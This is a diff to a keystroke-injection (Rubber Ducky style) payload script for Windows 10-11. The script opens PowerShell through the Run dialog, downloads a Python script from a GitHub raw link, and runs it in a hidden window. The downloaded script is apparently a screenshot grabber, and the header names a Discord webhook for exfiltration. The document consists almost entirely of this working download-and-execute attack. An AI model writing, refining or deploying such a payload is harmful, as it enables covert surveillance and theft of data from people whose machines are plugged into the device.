@@ -8,15 +8,12 @@ REM # Target       : Windows 10-11                    |
 REM #                                                 |
 REM ###################################################
 
-
 REM Requirements:
 REM     - Internet Connection
 REM     - Discord Webhook (or whatever you want for the exfiltration)
 
-
 REM REQUIRED - Set your Python script link
-DEFINE SCRIPT-PY-LINK https://github.com/nazarhktwitch/WinProdKey.ps1/blob/main/other/script_screenshot.py
-
+SET SCRIPT-PY-LINK=https://raw.githubusercontent.com/nazarhktwitch/WinProdKey.ps1/main/other/script_screenshot.py
 
 DELAY 1000
 GUI r
@@ -25,13 +22,15 @@ STRING powershell
 ENTER
 DELAY 2000
 
-
-STRING Invoke-WebRequest -Uri "
-STRING SCRIPT-PY-LINK
-STRING " -OutFile "script.py"
+REM Download the Python script
+STRING Invoke-WebRequest -Uri "%SCRIPT-PY-LINK%" -OutFile "script.py"
 ENTER
 DELAY 2000
 
-STRINGLN Start-Process python.exe -ArgumentList "script.py" -WindowStyle Hidden
+REM Execute the Python script in hidden window
+STRING Start-Process python.exe -ArgumentList "script.py" -WindowStyle Hidden
+ENTER
 DELAY 1000
+
+REM Close the window
 ALT F4
